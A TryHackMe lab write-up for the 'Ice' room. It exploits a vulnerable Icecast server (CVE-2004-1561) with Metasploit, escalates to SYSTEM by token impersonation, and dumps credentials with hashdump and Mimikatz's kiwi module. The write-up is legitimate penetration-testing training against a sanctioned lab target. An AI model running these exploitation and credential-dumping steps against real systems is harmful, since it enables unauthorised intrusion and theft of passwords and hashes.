---
title: THM — Ice
type: lab-writeup
platform: THM
difficulty: foundational
os: Windows
status: Complete
date: 2026-03-27
tags:
  - foundational
  - lab
  - THM
  - windows
  - icecast
  - buffer-overflow
  - CVE-2004-1561
  - metasploit
  - mimikatz
---

# THM — Ice

## Lab Info

| Field | Value |
|---|---|
| Platform | TryHackMe |
| Room | Ice |
| Difficulty | Easy |
| OS | Windows 7 |
| IP | Machine IP (assigned at room launch) |
| Date | 2026-03-27 |

> **Summary:** Icecast streaming server vulnerable to a header buffer overflow (CVE-2004-1561) grants initial Meterpreter session. Exploit missing patches and token impersonation to escalate to SYSTEM, then dump credentials with Mimikatz-style post modules.

---

## Objectives

- [x] Recon: identify Icecast service on non-standard port
- [x] Exploit: overflow Icecast headers for shell
- [x] Escalate: token impersonation to SYSTEM
- [x] Post-exploitation: credential extraction
- [x] Capture flags

---

## Enumeration

### Port scan

```bash
nmap -sC -sV -oN nmap/ice_initial <MACHINE_IP>
```

**Key open ports:**

| Port | Service | Notes |
|---|---|---|
| 135/tcp | msrpc | Microsoft RPC |
| 139/tcp | netbios-ssn | SMB |
| 445/tcp | microsoft-ds | SMB |
| 3389/tcp | ms-wbt-server | RDP |
| 8000/tcp | http | Icecast streaming media server |

---

## Vulnerability Background

**CVE-2004-1561** — Icecast Header Overwrite Vulnerability

| Field | Detail |
|---|---|
| CVE | CVE-2004-1561 |
| Affected | Icecast 2.0.1 and earlier |
| Type | Buffer overflow via HTTP header overwrite |
| Impact | Remote code execution |
| Root cause | Sending 32+ HTTP headers overflows a buffer, overwriting the saved return pointer |

---

## Foothold

### Exploitation with Metasploit

```bash
msfconsole

msf6 > use exploit/windows/http/icecast_header
msf6 exploit(...) > set RHOSTS <MACHINE_IP>
msf6 exploit(...) > set LHOST <YOUR_TUN0_IP>
msf6 exploit(...) > run
```

**Result:** Meterpreter session as user (not SYSTEM yet)

---

## Privilege Escalation

### Check architecture and suggest exploits

```
meterpreter > sysinfo
meterpreter > run post/multi/recon/local_exploit_suggester
```

### Token impersonation

```
meterpreter > getprivs
```

Look for `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.

```
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
```

**Result:** `NT AUTHORITY\SYSTEM`

---

## Post-Exploitation

### Process migration

Migrate to a stable SYSTEM process to avoid session drops:

```
meterpreter > ps
meterpreter > migrate -N spoolsv.exe
```

### Credential dumping

```
meterpreter > hashdump
```

Or use kiwi (Mimikatz integration):

```
meterpreter > load kiwi
meterpreter > creds_all
```

Extracts plaintext passwords, NTLM hashes, Kerberos tickets where available.

---

## Flags

| Flag | Location |
|---|---|
| User + Root | Per room task answers |

> Flag values omitted — record yours privately.

---

## Key Takeaways

- Icecast is a real-world streaming server found in enterprise environments — this CVE is ancient but teaches buffer overflow exploitation concepts
- `SeImpersonatePrivilege` is the key to token impersonation attacks — check `getprivs` immediately after landing
- Incognito module in Meterpreter enables token impersonation without uploading separate tools
- Always migrate to a stable SYSTEM process after escalation — your Meterpreter session is tied to the exploited process
- Kiwi (Mimikatz) in Meterpreter dumps credentials that enable lateral movement

---

## Tools Used

- Nmap
- Metasploit
- Meterpreter (incognito, kiwi)

---

## References

- [TryHackMe — Ice](https://tryhackme.com/room/ice)
- [NVD CVE-2004-1561](https://nvd.nist.gov/vuln/detail/CVE-2004-1561)

---
*Write-up completed: 2026-03-27*

## See Also

- Penetration-Testing-Methodology
- Windows-Privilege-Escalation
- Metasploit
- Common-Ports

---
<- [[Labs-MOC]]